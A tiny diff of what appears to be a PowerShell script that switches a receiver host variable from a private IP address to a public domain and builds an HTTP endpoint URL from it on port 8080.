@@ -1,4 +1,4 @@
-$RECV_HOST = "10.0.0.3"
+$RECV_HOST = "jasonthel.in"
 $RECV_PORT = "8080"
 $URL = 'http://' + $RECV_HOST + ':' + $RECV_PORT + '/endpoint'
 
